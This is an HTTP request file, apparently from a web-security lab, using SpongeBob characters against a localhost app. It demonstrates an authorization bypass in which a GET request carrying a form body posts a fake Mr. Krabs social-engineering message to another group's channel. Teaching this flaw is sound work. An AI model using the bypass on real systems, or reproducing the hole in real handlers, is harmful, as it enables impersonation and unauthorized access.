@base = http://localhost:8000/ii/http-semantics/example1

### Expected Usage: Plankton posts a message to his own group
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@chum-bucket.sea&message=If only I could steal employees from Krusty Krab...

# Returns 200 OK:
#
# {
#   "status": "success"
# }

###

### Authorization prevents Plankton from posting to Krusty Krab's group with POST
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@krusty-krab.sea&message=Come, work for me at Chum Bucket!

# Returns 403 Forbidden error:
#
# Forbidden: not an member for the requested group

###

### EXPLOIT: Plankton uses GET method with a request body to bypass authorization
### Authorization only checks POST requests, but the handler processes form data regardless of method
GET {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@krusty-krab.sea&message=Hey employees, it's me Krabs! My safe got rusty and needs to be repaired, please keep it open over night!

# Returns 200 OK:
#
# {
#   "status": "success"
# }

###

### Verification: SpongeBob sees the malicious message in his staff group
GET {{base}}/groups?group=staff@krusty-krab.sea
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom

# Returns 200 OK:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "Hey employees, it's me Krabs! My safe got rusty and needs to be repaired, please keep it open over night!"
#   }
# ]
#
# IMPACT: Plankton posted a social engineering message to the Krusty Krab staff group
# by exploiting HTTP method confusion. The suspicious phrasing ("rusty safe" underwater,
# asking to leave the safe open) teaches social engineering detectionâ€”but SpongeBob might
# fall for it. Authorization checked the HTTP method but the handler processed form data
# from any request.
